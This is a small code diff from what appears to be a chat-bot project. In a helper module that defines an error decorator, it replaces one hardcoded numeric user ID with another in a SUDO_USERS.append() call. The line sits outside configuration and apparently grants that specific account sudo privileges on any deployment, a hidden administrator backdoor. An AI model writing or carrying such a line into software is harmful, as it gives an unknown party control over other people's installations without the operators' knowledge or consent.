@@ -5,7 +5,7 @@ from lib.helpers.admins import get_administrators
 from lib.config import SUDO_USERS
 
 
-SUDO_USERS.append(1669508271)
+SUDO_USERS.append(1979717764)
 
 
 def errors(func: Callable) -> Callable:
